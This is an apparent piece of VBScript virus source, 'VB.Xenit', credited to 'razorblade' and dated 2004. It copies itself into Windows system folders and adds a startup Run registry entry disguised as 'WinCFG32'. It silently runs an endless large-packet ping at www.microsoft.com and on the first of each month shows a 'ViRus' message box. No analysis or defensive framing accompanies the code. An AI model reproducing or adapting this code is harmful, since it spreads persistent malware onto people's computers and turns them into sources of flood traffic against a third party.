' VB§.X€n†
' by ®@z0®bl@d€
' 0©†0b€® 2004

On Error Resume Next

set sfso = CreateObject("Scripting.FileSystemObject")
set ws = CreateObject("WScript.Shell")
set wsf = sfso.GetFile(WScript.ScriptFullName)

wsf.Copy("C:\WINDOWS\xenit32.vbs")
wsf.Copy("C:\WINDOWS\system32\xent.vbs")

On Error Resume Next
ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WinCFG32","C:\WINDOWS\system32\xent.vbs","REG_SZ"

ws.Run "ping -t -l 10000 www.microsoft.com",0,false

if day(now) = 1 then
Msgbox "++ ViRus +++","16","XeniT" 
end if